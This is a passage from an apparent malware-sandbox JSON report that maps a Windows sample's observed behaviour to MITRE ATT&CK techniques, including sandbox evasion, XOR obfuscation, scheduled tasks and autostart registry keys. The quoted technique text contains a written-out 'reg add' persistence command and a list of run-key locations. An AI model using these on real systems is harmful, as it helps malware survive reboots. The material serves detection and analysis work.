          "id: 0xff, version: 31947 count=1",
          "id: 0x102, version: 31947 count=1"
        ],
        "rich_pe_header_hash": "bdaa798c33c62da37f2c8e94ea08399c",
        "import_list": [
          {
            "library_name": "kernel32.dll",
            "imported_functions": [
              "lstrcpy"
            ]
          },
          {
            "library_name": "comctl32.dll",
            "imported_functions": [
              "InitCommonControls"
            ]
          }
        ]
      },
      "last_modification_date": 1706738192
    }
  },
  "mitre": {
    "data": {
      "CAPA": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "encode data using XOR"
                  }
                ]
              }
            ]
          }
        ]
      },
      "CAPE Sandbox": {
        "tactics": [
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture."
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get a listing of open application windows."
                  }
                ]
              },
              {
                "id": "T1083",
                "name": "File and Directory Discovery",
                "link": "https://attack.mitre.org/techniques/T1083/",
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system."
                  }
                ]
              },
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments."
                  }
                ]
              },
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get information about running processes on a system."
                  }
                ]
              },
              {
                "id": "T1012",
                "name": "Query Registry",
                "link": "https://attack.mitre.org/techniques/T1012/",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software."
                  }
                ]
              },
              {
                "id": "T1518",
                "name": "Software Discovery",
                "link": "https://attack.mitre.org/techniques/T1518/",
                "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments."
                  }
                ]
              },
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit."
                  }
                ]
              },
              {
                "id": "T1027.002",
                "name": "Software Packing",
                "link": "https://attack.mitre.org/techniques/T1027/002/",
                "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0011",
            "name": "Command and Control",
            "link": "https://attack.mitre.org/tactics/TA0011/",
            "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.",
            "techniques": [
              {
                "id": "T1071",
                "name": "Application Layer Protocol",
                "link": "https://attack.mitre.org/techniques/T1071/",
                "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."
                  }
                ]
              }
            ]
          }
        ]
      },
      "Yomi Hunter": {
        "tactics": [
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process may have looked for a particular process running on the system"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect a running debugger using common APIs"
                  }
                ]
              },
              {
                "id": "T1012",
                "name": "Query Registry",
                "link": "https://attack.mitre.org/techniques/T1012/",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to retrieve the BIOS version (maybe for checking the virtualization presence)"
                  }
                ]
              },
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to retrieve the BIOS version (maybe for checking the virtualization presence)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "encode data using XOR"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0009",
            "name": "Collection",
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "id": "T1119",
                "name": "Automated Collection",
                "link": "https://attack.mitre.org/techniques/T1119/",
                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to detect the presence of common debug and forensic utilities"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect debuggers and common forensic/analysis tools looking for known devices"
                  }
                ]
              }
            ]
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "id": "TA0002",
            "name": "Execution",
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "id": "T1059",
                "name": "Command and Scripting Interpreter",
                "link": "https://attack.mitre.org/techniques/T1059/",
                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Very long cmdline option found, this is very uncommon (may be encrypted or packed)"
                  }
                ]
              },
              {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "link": "https://attack.mitre.org/techniques/T1053/",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses schtasks.exe or at.exe to add and modify task schedules"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0003",
            "name": "Persistence",
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "link": "https://attack.mitre.org/techniques/T1053/",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses schtasks.exe or at.exe to add and modify task schedules"
                  }
                ]
              },
              {
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder",
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Creates an undocumented autostart registry key"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates an autostart registry key"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0004",
            "name": "Privilege Escalation",
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "link": "https://attack.mitre.org/techniques/T1053/",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses schtasks.exe or at.exe to add and modify task schedules"
                  }
                ]
              },
              {
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder",
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "LOW",
